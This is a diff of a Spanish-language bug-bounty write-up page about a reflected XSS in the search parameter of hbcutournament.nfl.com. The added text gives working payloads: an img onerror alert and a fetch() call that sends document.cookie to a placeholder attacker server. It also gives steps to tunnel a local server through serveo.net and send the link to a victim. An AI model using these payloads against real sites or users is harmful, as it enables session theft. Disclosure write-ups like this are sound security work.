@@ -16,37 +16,44 @@ layout: default
 
   <div class="bounty-content">
     <h2>🎯 Resumen de la Vulnerabilidad</h2>
-    <p>Se descubrió que la funcionalidad de búsqueda principal de la NFL era vulnerable a Cross-Site Scripting (XSS) reflejado. La vulnerabilidad residía en cómo la aplicación manejaba y reflejaba el parámetro de búsqueda en la página sin una codificación de salida adecuada.</p>
+    <p>Identificamos una vulnerabilidad de Cross-Site Scripting (XSS) reflejado en el dominio público <code>hbcutournament.nfl.com</code>. La vulnerabilidad reside en el parámetro del fragmento de URL de la página de resultados de búsqueda (<code>?q=</code>), que procesa incorrectamente la entrada del usuario sin el saneamiento adecuado.</p>
 
-    <h2>⚙️ Detalles Técnicos</h2>
-    <ul>
-      <li><strong>URL Afectada:</strong> <code>https://www.nfl.com/search/?query=[XSS_PAYLOAD]</code></li>
-      <li><strong>Parámetro Afectado:</strong> <code>query</code></li>
-      <li><strong>Vector:</strong> Inyección de scripts maliciosos a través de la URL.</li>
-    </ul>
+    <h2>⚙️ URLs Afectadas</h2>
+    <pre><code>https://hbcutournament.nfl.com/resources?q=
+https://hbcutournament.nfl.com/blogs?q=</code></pre>
 
-    <h2>🛠️ Pasos para Reproducir</h2>
-    <p>Al inyectar una etiqueta de script estándar en el parámetro <code>query</code>, confirmamos que la entrada se reflejaba directamente en el Document Object Model (DOM):</p>
+    <h2>🛠️ Payloads de Prueba de Concepto</h2>
     
-    <pre><code>"><script>alert(document.domain)</script></code></pre>
-    
-    <img src="../../../assets/images/nfl-xss-search-query/PayloadExecution.png" alt="Ejecución de Payload XSS">
+    <h3>Inyección HTML</h3>
+    <p>Lo primero que probamos en el campo de búsqueda fue una simple inyección HTML:</p>
+    <pre><code>&lt;h1&gt;This is a HTML Injection test&lt;/h1&gt; --- This is a normal text.</code></pre>
+    <img src="../../../assets/images/nfl-xss-search-query/NFL - XSS Search Query Parameter - HTML Injection.png" alt="Inyección HTML">
 
-    <p>La aplicación no saneaba la entrada, permitiendo que el script se ejecutara en el contexto del navegador de la víctima. Esto podría aprovecharse para robar información de sesión sensible o realizar acciones en nombre del usuario.</p>
+    <h3>XSS Reflejado</h3>
+    <p>Después de probar varios payloads, descubrimos que la etiqueta <code>&lt;img&gt;</code> funciona:</p>
+    <pre><code>&lt;img/src/onerror=alert(8)&gt;</code></pre>
+    <img src="../../../assets/images/nfl-xss-search-query/NFL - XSS Search Query Parameter - Alert 1.png" alt="Prueba de Alerta">
 
-    <h2>⚠️ Impacto de Seguridad</h2>
-    <p>Un atacante podría diseñar un enlace malicioso y enviarlo a un usuario autenticado. Una vez pulsado, el atacante podría:</p>
-    <ul>
-      <li>Exfiltrar cookies de sesión y eludir la autenticación.</li>
-      <li>Realizar acciones no autorizadas (impacto similar a CSRF a través de XSS).</li>
-      <li>Alterar el contenido del sitio web para usuarios específicos.</li>
-    </ul>
+    <h3>XSS Reflejado con exfiltración de Cookies</h3>
+    <p>Tras verificar que podíamos ejecutar código JavaScript, intentamos exfiltrar las cookies para robar datos de sesión.</p>
+    <pre><code>&lt;img/src/onerror=fetch("http://tu-servidor-web/"+encodeURIComponent(document.cookie))&gt;</code></pre>
+    <img src="../../../assets/images/nfl-xss-search-query/NFL - XSS Search Query Parameter - Cookies Exfiltration.png" alt="Payload de Exfiltración de Cookies">
+    <img src="../../../assets/images/nfl-xss-search-query/NFL - XSS Search Query Parameter - Cookies Exfiltration Result.png" alt="Resultado de la Exfiltración">
+
+    <h2>🚀 Pasos para Reproducir</h2>
+    <ol>
+      <li>Inicia un servidor web local: <code>python3 -m http.server 8000</code></li>
+      <li>Exponlo públicamente (por ejemplo, usando Serveo): <code>ssh -R 80:localhost:8000 serveo.net</code></li>
+      <li>Prepara la URL maliciosa con la dirección de tu servidor.</li>
+      <li>Comparte la URL con un usuario autenticado.</li>
+      <li>Recibe las cookies de la víctima de nuestro lado.</li>
+    </ol>
 
     <h2>🤝 Detalle de Colaboración</h2>
-    <p>Esta investigación fue realizada en una colaboración conjunta:</p>
+    <p>Esta investigación fue realizada en un esfuerzo conjunto con los siguientes investigadores:</p>
     <ul>
-      <li><strong>{{ site.researchers.ivan.name }}</strong> (Investigador Principal)</li>
-      <li><strong>{{ site.researchers.diego.name }}</strong> (Analista de Seguridad)</li>
+      <li><strong>{{ site.researchers.ivan.name }}</strong> (Investigador principal)</li>
+      <li><strong>{{ site.researchers.diego.name }}</strong> (Analista de seguridad)</li>
     </ul>
 
     <div class="card-grid" style="margin-top: 3rem;">
@@ -56,7 +63,7 @@ layout: default
       </div>
       <div class="glass-card">
         <small>Severidad</small>
-        <strong>P3 (Media)</strong>
+        <strong>Alta (reportada como P3)</strong>
       </div>
     </div>
   </div>
